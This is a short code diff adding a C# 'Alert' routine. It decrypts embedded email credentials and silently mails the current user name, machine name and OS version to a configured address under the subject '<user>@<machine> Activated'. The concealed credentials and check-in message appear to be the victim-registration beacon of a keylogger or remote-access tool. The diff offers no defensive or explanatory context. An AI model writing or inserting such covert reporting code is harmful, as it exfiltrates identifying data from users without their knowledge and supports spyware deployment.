@@ -1,0 +1,22 @@
+static void Alert()
+    {
+        try
+        {
+            NetworkCredential creds = new NetworkCredential(Decrypt("[EMAIL]", "[PASS]"), Decrypt("[PASSWORD]", "[PASS]"));
+            MailMessage mail = new MailMessage();
+            mail.To.Add(Decrypt("[EMAIL]", "[PASS]"));
+            mail.From = new MailAddress(Decrypt("[EMAIL]", "[PASS]"));
+            mail.Subject = Environment.UserName + "@" + Environment.MachineName + " Activated";
+            mail.Body = Environment.UserName + " is logged in on PC: " + Environment.MachineName + "\nOS: " + Environment.OSVersion;
+
+            SmtpClient client = new SmtpClient("[EMAIL SERVER]", Convert.ToInt32("[SERVER PORT]"));
+            client.DeliveryMethod = SmtpDeliveryMethod.Network;
+            client.Credentials = creds;
+            client.EnableSsl = true;
+            client.Send(mail);
+        }
+        catch (Exception e)
+        {
+            MessageBox.Show(e.Message);
+        }
+    }
